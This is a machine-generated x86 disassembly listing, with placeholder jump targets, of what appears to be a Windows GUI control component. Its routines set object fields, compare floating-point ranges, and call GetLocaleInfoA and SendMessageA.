je r-xdata
add esp 0xfffffff0
call sub_403550
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_448564
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_448655
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40313c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041e0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404014
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40313c
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc04
call sub_4039b8
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ esi + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ esi + 0x18 ] edx
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44865c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_448670
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
cmp eax 0x5
ja r-xdata
mov eax [ ebx + 0x4 ]
call sub_45c684
test al al
je r-xdata
jmp [ eax * 4 + jump_table_448687 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4242e8
mov ecx eax
mov edx [ esi * 4 + rw-data ]
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xd8 ]
mov [ ebx + 0x8 ] edi
jmp r-xdata
mov [ ebx + 0xc ] edi
jmp r-xdata
mov [ ebx + 0x10 ] edi
jmp r-xdata
mov [ ebx + 0x14 ] edi
jmp r-xdata
mov [ ebx + 0x18 ] edi
jmp r-xdata
mov [ ebx + 0x1c ] edi
sub_4486e8
push ebx
mov ebx eax
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
call sub_448670
mov ecx [ ebx + 0xc ]
mov edx 0x1
mov eax ebx
call sub_448670
mov ecx [ ebx + 0x10 ]
mov edx 0x2
mov eax ebx
call sub_448670
mov ecx [ ebx + 0x14 ]
mov edx 0x3
mov eax ebx
call sub_448670
mov ecx [ ebx + 0x18 ]
mov edx 0x4
mov eax ebx
call sub_448670
mov ecx [ ebx + 0x1c ]
mov edx 0x5
mov eax ebx
call sub_448670
pop ebx
retn
sub_448744
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x100
call sub_440e00
mov ecx esi
xor edx edx
mov eax edi
call sub_458074
mov [ edi + 0x245 ] 0x1
mov [ edi + 0x246 ] 0x1
mov eax [ r-xdata ]
mov [ edi + 0x50 ] eax
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_448514
mov [ edi + 0x208 ] eax
call sub_409d54
fstp [ edi + 0x210 ]
fwait
mov [ edi + 0x220 ] 0x7
mov [ edi + 0x230 ] 0x1f
mov [ edi + 0x240 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4487e0
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458198
mov eax [ esi + 0x208 ]
call sub_4031ec
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_448814
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_448915
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44891c
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fa0
retn
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a9e0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb48
call sub_4039b8
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0x14 ]
call sub_40a9e0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb48
call sub_4039b8
sub_448928
push ebx
mov ebx eax
mov eax ebx
call sub_459300
mov eax [ ebx + 0x208 ]
call sub_4486e8
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_448f4c
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_448d94
mov edx [ ebx + 0x240 ]
mov eax ebx
call sub_448ed0
mov dl [ ebx + 0x220 ]
mov eax ebx
call sub_448c40
cmp [ ebx + 0x244 ] 0x0
je r-xdata
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_448b30
pop ebx
retn
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_44909c
pop ebx
retn
sub_4489c4
xor edx edx
mov dl [ eax + 0x245 ]
mov edx [ edx * 4 + rw-data ]
or edx 0x1
xor ecx ecx
mov cl [ eax + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x247 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0x244 ]
or edx [ eax * 4 + rw-data ]
mov eax edx
retn
sub_448a78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push [ eax + 0x214 ]
push [ eax + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_409da4
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
xor eax eax
push ebp
push sub_448afd
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
call sub_4029fc
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] edx
fild [ ebp - 0xc ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_448b30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_448b30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409c7c
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x21c ]
push [ ebx + 0x218 ]
mov eax ebx
call sub_44909c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x214 ] eax
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_448bb8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebx + 0x218 ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
fld [ ebp - 0x8 ]
fadd [ r-xdata ]
fstp [ ebp + 0x8 ]
fwait
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax ebx
call sub_448a48
add esp 0xfffffff8
fstp [ esp ]
fwait
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_44909c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_448c40
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_45c684
test al al
je r-xdata
mov [ esi + 0x220 ] bl
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x7
jne r-xdata
mov edi ebx
and edi 0x7f
push 0x2
lea eax [ esp + 0x4 ]
push eax
push 0x100c
push 0x400
call GetLocaleInfoA
movzx edi [ esp ]
sub edi 0x30
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx edi
call sub_42cb6c
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
sub_448ca8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_448d80
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x228 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x238 ]
fnstsw ax
sahf
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448d87
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fa0
retn
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_448f4c
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x228 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x22c ] eax
push [ ebx + 0x23c ]
push [ ebx + 0x238 ]
lea eax [ ebp - 0xc ]
call sub_40a9e0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb48
call sub_4039b8
sub_448d94
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42cb08
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_448de4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_448ebc
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
fld [ ebx + 0x238 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
je r-xdata
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x228 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448ec3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fa0
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
mov eax ebx
call sub_448f4c
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x238 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x23c ] eax
push [ ebx + 0x22c ]
push [ ebx + 0x228 ]
lea eax [ ebp - 0xc ]
call sub_40a9e0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ ebx + 0x20c ]
call sub_40bb48
call sub_4039b8
sub_448ed0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov [ ebx + 0x240 ] esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov edx esi
call sub_42cb98
sub_448f0c
cmp dl [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] dl
test dl dl
je r-xdata
xor edx edx
mov [ eax + 0x218 ] edx
mov [ eax + 0x21c ] edx
mov edx [ eax + 0x210 ]
mov [ eax + 0x218 ] edx
mov edx [ eax + 0x214 ]
mov [ eax + 0x21c ] edx
jmp r-xdata
call sub_4598e8
sub_448f4c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov ebx eax
xor esi esi
fld [ ebp + 0x10 ]
call sub_4029fc
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
fld [ ebp + 0x8 ]
call sub_4029fc
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fld [ ebx + 0x210 ]
call sub_4029fc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fld [ ebx + 0x218 ]
call sub_4029fc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
je r-xdata
cmp [ ebp - 0x18 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_448a78
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
lea ecx [ ebp - 0x40 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xe0 ]
test al al
jne r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
jge r-xdata
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x1c ]
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_448a78
jmp r-xdata
or esi 0x1
fild [ ebp - 0x18 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x40 ]
call sub_409c7c
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_448bb8
jmp r-xdata
jle r-xdata
cmp eax [ ebp - 0x20 ]
jbe r-xdata
or esi 0x2
fild [ ebp - 0x20 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
lea eax [ ebp - 0x30 ]
call sub_409c7c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_448bb8
jmp r-xdata
sub_44909c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov ebx eax
cmp [ ebx + 0x244 ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x20 ]
call sub_409c7c
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_409c7c
mov eax ebx
call sub_45c684
test al al
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax ebx
call sub_448b30
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x214 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x218 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x21c ] eax
mov eax ebx
call sub_45c380
lea edx [ ebp - 0x20 ]
call sub_42cb20
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbc8
call sub_4039b8
sub_4491a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_448744
mov edx 0xbf
mov eax esi
call sub_455208
mov edx 0x9a
mov eax esi
call sub_45522c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_449200
push ebx
mov ebx eax
mov eax ebx
call sub_45b8a4
mov eax ebx
call sub_45c684
test al al
je r-xdata
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x5
mov eax ebx
call sub_456c00
sub_449228
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ecx [ esi + 0x8 ]
mov edx ecx
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffd13
je r-xdata
lea edi [ ecx + 0xc ]
mov eax edi
call sub_449198
test al al
jne r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax edi
call sub_409cbc
fstp [ ebx + 0x210 ]
fwait
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x1c ]
shl edx 0x2
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
xor ecx ecx
call sub_402bf8
cmp [ ebx + 0x24a ] 0x0
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
lea edi [ eax + 0x1c ]
mov eax edi
call sub_449198
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x20 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov eax [ eax + 0x1c ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
mov eax edi
call sub_409cbc
fstp [ ebx + 0x218 ]
fwait
inc eax
mov [ esp + 0xc ] eax
mov [ esp ] 0x0
mov edx [ esp + 0x4 ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
add [ esp + 0x4 ] 0x4
inc [ esp ]
dec [ esp + 0xc ]
jne r-xdata
sub eax 0xc
mov eax [ esp + 0x8 ]
movzx eax [ eax + 0xe ]
add eax [ esp ]
cmp eax 0xc
jle r-xdata
jmp r-xdata
sub_449338
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c684
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45cdd0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_45c380
lea edx [ ebp - 0x14 ]
call sub_42cb38
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ edi ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
cmp eax [ esi ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov [ edi ] edx
mov [ esi ] eax
sub_4493a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4591d4
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_459100
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
or [ ebx + 0x4 ] eax
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_4493f4
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45c380
mov ecx ebp
mov edx edi
call sub_42cb50
cmp eax 0xffffffff
setne bl
sub_449428
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov bl 0x1
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45c380
mov edx esp
call sub_42caf0
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_449464
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_45c684
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_45c380
mov ecx ebp
mov edx edi
call sub_42cb7c
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_44949c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
mov eax esi
call sub_45c684
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
mov eax esp
push eax
xor ecx ecx
mov edx 0x1009
mov eax esi
call sub_456c00
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebp ] eax
jmp r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4494ec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43af20
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_403fd0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_449538
push ebx
mov ebx eax
mov eax ebx
call sub_43b020
mov eax ebx
call sub_4197bc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_43b218
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_44956c
push ebx
mov ebx eax
mov eax ebx
call sub_43b03c
mov eax ebx
call sub_4197bc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebx + 0x4 ]
mov al [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_43b218
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_4495c0
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_43b048
mov eax ebx
call sub_4197bc
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop ebx
retn
sub_4495f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4198e4
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
pop esi
pop ebx
retn
sub_449650
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_449644
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_4197bc
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4496cc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419d1c
mov ebp eax
mov esi ebx
mov eax edi
call sub_419b1c
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
sub_449704
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x10 ]
call sub_403f7c
pop esi
pop ebx
retn
sub cl 0x2
jb r-xdata
mov eax esi
call sub_419e2c
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_4197bc
push eax
push 0x144
mov eax esi
call sub_419e2c
call sub_45c380
push eax
call SendMessageA
sub_449778
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402bf8
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
mov eax esp
push eax
push 0x0
push 0x404
mov eax esi
call sub_419e2c
call sub_45c380
push eax
call SendMessageA
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_4496b8
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_40443c
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_4197bc
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_40423c
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
